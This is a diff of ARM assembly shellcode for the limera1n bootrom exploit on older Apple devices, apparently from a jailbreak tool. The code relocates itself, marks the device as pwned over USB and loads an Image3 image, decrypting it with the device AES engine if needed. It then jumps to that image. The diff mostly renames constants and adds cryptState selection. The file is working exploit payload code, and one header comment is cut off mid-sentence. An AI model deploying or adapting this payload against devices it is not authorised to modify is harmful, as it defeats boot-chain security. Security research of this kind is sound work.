@@ -1,10 +1,10 @@
 @ limera1n-shellcode.S
-@ Authors: npupyshev, axi0mX
-@ Shellcode for limera1n exploit with minor improvements:
-@ * reports PWND:[limera1n] in USB serial number string
+@ Authors: npupyshev (Image3 loader), axi0mX (shellcode bootstrap)
+@ Shellcode for limera1n exploit that loads, optionally decrypts and executes an Image3 file.
+@ This shellcode appends PWND:[limera1n] string to the 
 
 .text
- 
+
 .pool
 .set free,                          0x3b95
 .set memmove,                       0x84dc
@@ -21,47 +21,44 @@
 .set gLeakingDFUBuffer,             0x8402dbcc
 .set gUSBSerialNumber,              0x8402e0e0
 
-.set RELOCATE_SHELLCODE_ADDRESS,    0x84039800
-.set RELOCATE_SHELLCODE_SIZE,       0x200
-.set MAIN_STACK_ADDRESS,            0x8403c000
-.set LOAD_ADDRESS,                  0x84000000
-.set MAX_SIZE,                      0x2c000
+.set kShellcodeBase,                0x84039800
+.set kShellcodeSize,                0x180
+.set kStackBase,                    0x8403c000
+.set kDFUImageLoadAddress,          0x84000000
+.set kDFUImageMaxSize,              0x2c000
 
-.global _start
-
-_start:
+_start: .global _start
 .code 16
-    B   relocate_shellcode                      @ goto relocate_shellcode
-
-    NOP
-    NOP
-    NOP
-    NOP                                         
-    NOP                                         
-    NOP                                         
-    NOP
-    NOP
-    NOP
-
+	B relocate_shellcode	
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	
 relocate_shellcode:
-    MOV R1, PC
-    SUB R1, #4                              @ R1 = PC - 4
-
-    LDR R0, =RELOCATE_SHELLCODE_ADDRESS
-    CMP R0, R1
-    BEQ pwned_dfu_start                         @ if (R1 == RELOCATE_SHELLCODE_ADDRESS) goto pwned_dfu_start
-
-    LDR R2, =RELOCATE_SHELLCODE_SIZE            @ R2 = RELOCATE_SHELLCODE_SIZE
-    LDR R3, =memmove
-    BLX R3                                      @ memmove(RELOCATE_SHELLCODE_ADDRESS, R1, RELOCATE_SHELLCODE_SIZE)
-
-    LDR R3, =RELOCATE_SHELLCODE_ADDRESS
-    ADD R3, #1
-    BX R3                                       @ goto (RELOCATE_SHELLCODE_ADDRESS + 1)
-
+	MOV R1, PC
+	SUB R1, #4                                  @ R1 = PC - 4;
+	
+	LDR R0, =kShellcodeBase
+	CMP R0, R1
+	BEQ pwned_dfu_start                         @ if (R1 == kShellcodeBase) goto pwned_dfu_start;
+	
+	LDR R2, =kShellcodeSize                     @ R2 = kShellcodeSize;
+	LDR R3, =memmove
+	BLX R3                                      @ memmove(kShellcodeBase, R1, kShellcodeSize);
+	
+	LDR R3, =kShellcodeBase
+	ADD R3, #1
+	BX R3                                       @ goto (kShellcodeBase + 1);
+	
 pwned_dfu_start:
-    LDR R0, =MAIN_STACK_ADDRESS
-    MOV SP, R0                                  @ SP = MAIN_STACK_ADDRESS
+    LDR R0, =kStackBase
+    MOV SP, R0                                  @ SP = kStackBase;
 	
     LDR R0, =gUSBSerialNumber
     ADR R1, PWND_STRING
@@ -70,29 +67,25 @@ pwned_dfu_start:
     BLX R3                                      @ strlcat(gUSBSerialNumber, PWND_STRING, 120)
 	
 pwned_dfu_loop:
-    LDR R3, =usb_wait_for_image
-    LDR R0, =LOAD_ADDRESS
-    LDR R1, =MAX_SIZE
-    BLX R3                                      @ R0 = usb_wait_for_image(LOAD_ADDRESS, MAX_SIZE)
-
-    MOV R4, R0                                  @ R4 = R0
-
-    LDR R1, =gLeakingDFUBuffer
+	LDR R0, =kDFUImageLoadAddress
+	LDR R1, =kDFUImageMaxSize
+	LDR R4, =usb_wait_for_image
+	BLX R4                                      @ ret = usb_wait_for_image(kDFUImageLoadAddress, MAX_SIZE)
+	
+	MOV R4, R0                                  @ R4 = R0
+	
+	LDR R1, =gLeakingDFUBuffer
 	LDR R0, [R1]
-
-    MOV R2, #0
-    STR R2, [R1]                                @ gLeakingDFUBuffer = 0
-
-    LDR R3, =free
-    BLX R3                                      @ free(R0)
-
+	
+	MOV R2, #0
+	STR R2, [R1]                                @ *gLeakingDFUBuffer = 0
+	
+	LDR R3, =free
+	BLX R3                                      @ free(*gLeakingDFUBuffer)
+	
     CMP R4, #0
-    BLT pwned_dfu_loop                          @ if (R4 < 0) goto pwned_dfu_loop
-
-    LDR R5, =LOAD_ADDRESS
-    LDR R0, [R5]                                @ R0 = LOAD_ADDRESS[0]
-
-
+    BLT pwned_dfu_loop                          @ if (R4 < 0) goto pwned_dfu_loop;
+	
 image3_load:
 	@ SP + 0x00 = &arg5
 	@ SP + 0x04 = &arg6
@@ -102,22 +95,22 @@ image3_load:
 	@ SP + 0x14 = &dataLength
 	@ SP + 0x18 = &iv[16]
 	@ SP + 0x28 = &key[32]
-
+	
 	SUB SP, #0x48
-
-	@ ret = image3_load_create_object(&objectHandle, LOAD_ADDRESS, MAX_SIZE, false);
+	
+	@ ret = image3_load_create_object(&objectHandle, kDFUImageLoadAddress, kDFUImageMaxSize, false);
 	MOV R0, SP
 	ADD R0, #0xC                                @ arg1 = &objectHandle
-	MOV R1, R5                                  @ arg2 = LOAD_ADDRESS
-	LDR R2, =MAX_SIZE                           @ arg3 = MAX_SIZE
+	LDR R1, =kDFUImageLoadAddress               @ arg2 = kDFUImageLoadAddress
+	LDR R2, =kDFUImageMaxSize                   @ arg3 = kDFUImageMaxSize
 	MOV R3, #0                                  @ arg4 = false (no copy)
 	LDR R4, =image3_load_create_object
 	BLX R4
-
+	
 	@ if (ret != 0) goto image3_load_fail;
 	CMP R0, #0
 	BNE image3_load_fail
-
+	
 	@ ret = image3_load_get_tag_data(objectHandle, 'DATA', &dataAddress, &dataLength, 0);
 	STR R0, [SP]                                @ arg5 = 0
 	STR R0, [SP, #0x14]                         @ dataLength = 0
@@ -128,11 +121,11 @@ image3_load:
 	ADD R3, R2, #0x4                            @ arg4 = &dataLength
 	LDR R4, =image3_load_get_tag_data
 	BLX R4
-
+	
 	@ if (ret != 0) goto image3_load_fail;
 	CMP R0, #0
 	BNE image3_load_fail
-
+	
 	@ prepare image3_load_get_tag_data pointer
 	LDR R4, =image3_load_get_tag_data
 	MOV R6, #0                                  @ i = 0
@@ -148,7 +141,7 @@ image3_load_kbag_loop:
 	ADD R3, R2, #0x04                           @ arg4 = &arg7 (store keybag size in arg7)
 	STR R6, [SP]                                @ arg5 = i
 	BLX R4
-
+	
 	CMP R0, #0
 	BNE image3_load_copy_data
 	
@@ -156,11 +149,18 @@ image3_load_kbag_loop:
 	LDR R0, [SP, #0x08]                         @ R0 = keybagLength
 	CMP R0, #40                                 @ cryptState + keyLength + iv + AES 128 key
 	BLT image3_load_fail
-	
-	@ if (cryptState != 1) continue;
+
+	@ calculate required cryptState
+	LDR R1, =0xBF500000
+	LDRB R2, [R1]
+	MOV R5, #1
+	AND R2, R5
+	MOV R5, #2
+	SUB R5, R2
+	@ if (cryptState != R5) continue;
 	LDR R1, [SP, #0x04]                         @ R1 = keybagAddr
 	LDR R2, [R1]                                @ R2 = cryptState
-	CMP R2, #1
+	CMP R2, R5
 	BNE image3_load_kbag_loop
 	
 	@ if (keySizeBits / 8 + 24 > keybagLength) goto image3_load_fail;
@@ -185,7 +185,7 @@ image3_load_kbag_key_256:
 	LSL R7, R7, #1
 image3_load_kbag_key_192:
 	LSL R7, R7, #28
-
+	
 image3_load_kbag_key_ok:
 	@ memmove(&iv, &keybag->iv, sizeof(iv) + keySizeBits / 8);
 	MOV R0, SP
@@ -210,7 +210,7 @@ image3_load_kbag_key_ok:
 	STR R4, [SP, #8]                            @ arg7 = 0
 	LDR R4, =aes_crypto_cmd
 	BLX R4
-
+	
 	@ aes_crypto_cmd(17, dataAddress, dataAddress, dataLength, enc_flags, key, iv);
 	MOV R0, #17                                 @ arg1 = 17
 	LDR R1, [SP, #0x10]                         @ arg2 = dataAddress
@@ -223,19 +223,19 @@ image3_load_kbag_key_ok:
 	SUB R7, #0x10
 	STR R7, [SP, #8]                            @ arg7 = iv
 	BLX R4
-
+	
 image3_load_copy_data:
-	@ memmove(LOAD_ADDRESS, dataAddress, dataLength);
-	LDR R0, =LOAD_ADDRESS                       @ arg1 = LOAD_ADDRESS
+	@ memmove(kDFUImageLoadAddress, dataAddress, dataLength);
+	LDR R0, =kDFUImageLoadAddress               @ arg1 = kDFUImageLoadAddress
 	LDR R1, [SP, #0x10]                         @ arg2 = dataAddress
 	LDR R2, [SP, #0x14]                         @ arg3 = dataLength
 	MOV R5, R0
 	LDR R4, =memmove
 	BLX R4
-
-	@ jump_to(0, LOAD_ADDRESS, 0);
+	
+	@ jump_to(0, kDFUImageLoadAddress, 0);
 	MOV R0, #0                                  @ arg1 = 0
-	MOV R1, R5                                  @ arg2 = LOAD_ADDRESS
+	MOV R1, R5                                  @ arg2 = kDFUImageLoadAddress
 	MOV R2, #0                                  @ arg3 = 0
 	LDR R4, =jump_to
 	BLX R4
